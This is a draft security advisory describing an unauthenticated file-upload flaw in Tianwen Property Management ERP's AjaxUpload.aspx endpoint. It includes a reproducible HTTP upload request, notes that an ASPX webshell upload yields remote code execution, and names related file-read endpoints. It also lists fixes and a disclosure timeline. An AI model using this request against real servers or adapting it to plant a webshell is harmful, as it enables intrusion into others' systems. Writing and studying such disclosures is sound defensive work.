# Advisory Draft - Tianwen Property ERP Unauthenticated File Upload

## 1. Overview

- **Product:** Tianwen Property Management ERP (天问物业ERP系统)
- **Module:** `/HM/M_Main/`
- **Endpoint:** `POST /HM/M_Main/AjaxUpload.aspx`
- **Severity:** Critical (unauthenticated arbitrary file upload → RCE)
- **CWE:** CWE-434

## 2. Description

The `AjaxUpload.aspx` handler accepts `multipart/form-data` uploads on the
`UpFileData` field and stores them under `/HM/M_Main/UploadFiles/` without
validating the file extension. The server echoes the stored relative path in
the HTTP response. An unauthenticated attacker can upload an ASPX page and
execute arbitrary code on the Windows/IIS host.

## 3. Reproduction (benign marker)

```
POST /HM/M_Main/AjaxUpload.aspx HTTP/1.1
Host: <target>
Content-Type: multipart/form-data; boundary=----TianwenPoC

------TianwenPoC
Content-Disposition: form-data; name="UpFileData"; filename="secpoc_xxxx.txt"
Content-Type: text/plain

Tianwen-ERP-Unauth-Upload-PoC
------TianwenPoC--
```

Response contains the stored path:
`/HM/M_Main/UploadFiles/secpoc_xxxx.txt`

Requesting the returned path returns the uploaded content, confirming
unrestricted upload.

## 4. Impact

- Arbitrary file write on the web server.
- Upload of an ASPX webshell → remote code execution as the IIS application
  pool identity.
- Combined with the arbitrary file-read issues in the same module
  (`AreaAvatarDownLoad.aspx`, `ContractDownLoad.aspx`, `docfileDownLoad.aspx`),
  an attacker gains both read and write access to the server.

## 5. Affected Versions

Unknown at time of writing - vendor contact pending. All builds exposing the
`/HM/M_Main/` module should be assumed affected until patched.

## 6. Suggested Fix

- Whitelist extensions server-side.
- Store uploads outside the web root with randomized names.
- Serve uploads only with `Content-Disposition: attachment`.
- Validate content magic bytes.
- Review sibling `DownLoad.aspx` endpoints for path traversal.

## 7. Timeline

| Date | Event |
|------|-------|
| 2026-08-01 | Internal research; single-target benign PoC validated |
| TBD | Vendor contacted (90-day window) |
| TBD | Public disclosure after window closes or fix confirmed |
